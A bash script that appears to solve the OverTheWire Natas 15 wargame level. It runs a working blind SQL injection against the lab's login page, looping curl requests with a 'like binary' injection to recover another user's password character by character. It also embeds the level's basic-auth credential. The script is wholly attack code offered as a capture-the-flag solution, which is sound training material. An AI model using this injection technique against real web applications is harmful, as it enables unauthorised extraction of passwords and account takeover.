#!/bin/bash
# natas 15 --> 16
front=''
for n in {1..65}
do
	change=0
	echo "on round $n:"
	for l in {a..z} {A..Z} {0..9}
	do
		curl -s 'http://natas15.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
  --data-raw 'username=natas16%22++and+password+like+binary+%22'$front$l'%25' \ > output.txt
		  if grep -q "user exists." output.txt
		  then 
			  front+=$l # Append new successful char to beginning
			  change=1
			  echo "found new char: $l -- $front"
			  break # break out of loop early
		  fi
	done
	# Break when no changes to password is found
	if [ $change == 0 ]; then echo "final -->> $front <<-- PIAZZA!"; break; fi 
done
